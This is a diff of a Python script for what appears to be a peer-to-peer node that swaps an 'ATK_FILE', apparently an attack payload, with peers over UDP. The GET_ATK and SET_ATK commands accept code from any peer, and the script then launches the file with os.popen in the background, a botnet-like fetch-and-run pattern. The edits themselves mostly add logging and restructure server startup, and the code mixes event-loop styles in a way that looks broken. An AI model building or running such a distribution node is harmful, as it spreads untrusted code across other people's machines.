@@ -18,6 +18,7 @@ BOOTSTARP_IP = sys.argv[1]
 BOOTSTRAP_NODES = [(BOOTSTARP_IP, BOOTSTARP_PORT)]
 ATK_UDP_PORT = 9191
 
+
 class EchoClientProtocol:
     def __init__(self, message, loop):
         self.message = message
@@ -55,12 +56,14 @@ class EchoServerProtocol:
         print('Received %r from %s' % (message, addr))
         handle_msg(self.transport, message, addr)
 
+
 def handle_msg(i_transport, i_data, i_addr):
 
     local_data = json.loads(i_data)
     cmd = local_data['cmd']
 
     if cmd == 'GET_ATK':
+        print('GET_ATK from {}'.format(i_addr))
         l_data = None
         with open(ATK_FILE, 'br') as model:
             l_data = base64.b64encode(model.read())
@@ -70,6 +73,7 @@ def handle_msg(i_transport, i_data, i_addr):
         i_transport.sendto(json.dumps(local_msg).encode(), i_addr)
     
     elif cmd == 'SET_ATK':
+        print('SET_ATK from {}'.format(i_addr))
         l_data = local_data['data']
         l_data = l_data.encode("utf-8")
 
@@ -82,11 +86,17 @@ def handle_msg(i_transport, i_data, i_addr):
     else:
         print('[-]Invalid message received.')
 
-def send_msg(i_msg, i_ip, i_port):
 
+def send_msg(i_msg, i_ip, i_port):
     connect = loop.create_datagram_endpoint(lambda: EchoClientProtocol(i_msg, loop), remote_addr=(i_ip, i_port))
     transport, protocol = loop.run_until_complete(connect)
     #loop.run_until_complete(coro)
+
+
+async def main_server(host, port):
+    loop = asyncio.get_running_loop()
+    server = await loop.create_server(EchoServerProtocol, host, port)
+    await server.serve_forever()
 
 
 def get_my_ip():
@@ -96,19 +106,14 @@ def get_my_ip():
     # Keep some verifier, see the returned item is ok or not.
     return f.read().rstrip() 
 
-MY_IP = get_my_ip()
 
+MY_IP = get_my_ip()
 loop = asyncio.get_event_loop()
 
 # Create a node and start listening on port 5678
 node = Server()
 loop.run_until_complete(node.listen(BOOTSTARP_PORT))
-
 loop.run_until_complete(node.bootstrap(BOOTSTRAP_NODES))
-
-print('[+]Starting UDP server on {}.'.format(UDP_PORT))
-listen = loop.create_datagram_endpoint(EchoServerProtocol, local_addr=('0.0.0.0', UDP_PORT))
-transport, protocol = loop.run_until_complete(listen)
 
 print('[+]Getting ATK_FILES.')
 ATK_HOLDERS = None
@@ -140,6 +145,8 @@ while True:
 f = os.popen("python3 {} {}&".format(ATK_FILE, BOOTSTARP_IP))
 print(f.read())
 
+print('[+]Starting UDP server on {}.'.format(UDP_PORT))
+asyncio.run(main_server('0.0.0.0', UDP_PORT))
 
 if __name__ == '__main__':
   try:
